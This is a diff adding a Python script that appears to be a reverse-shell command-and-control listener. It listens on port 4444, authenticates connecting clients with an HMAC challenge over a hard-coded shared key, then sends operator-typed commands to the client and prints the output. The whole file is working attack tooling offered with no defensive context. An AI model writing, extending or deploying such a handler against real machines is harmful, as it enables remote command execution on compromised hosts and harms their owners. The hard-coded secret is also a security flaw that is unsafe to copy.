@@ -1,0 +1,71 @@
+import socket
+import hmac
+import hashlib
+import os
+
+HOST = "0.0.0.0"
+PORT = 4444
+SECRET = "my_shared_key"
+
+
+def compute_hmac(secret, message):
+    return hmac.new(secret.encode(), message, hashlib.sha256).digest()
+
+
+def generate_challenge():
+    return os.urandom(16)
+
+
+def authenticate(conn, secret):
+    try:
+        challenge = generate_challenge()
+        conn.sendall(challenge)
+
+        response = conn.recv(1024)
+        if not response:
+            return False
+
+        expected = compute_hmac(secret, challenge)
+
+        if hmac.compare_digest(response, expected):
+            conn.sendall(b"OK")
+            return True
+        else:
+            conn.sendall(b"FAIL")
+            return False
+    except:
+        return False
+
+
+def main():
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind((HOST, PORT))
+    server.listen(5)
+
+    print(f"[+] Listening on port {PORT}...")
+
+    while True:
+        conn, addr = server.accept()
+        print(f"[+] Connection from {addr}")
+
+        if not authenticate(conn, SECRET):
+            print("[-] Authentication failed")
+            conn.close()
+            continue
+
+        command = input("Enter command: ")
+
+        conn.sendall(command.encode())
+
+        output = conn.recv(8192)
+
+        if not output:
+            print("[-] No response")
+        else:
+            print(output.decode())
+
+        conn.close()
+
+
+if __name__ == "__main__":
+    main()
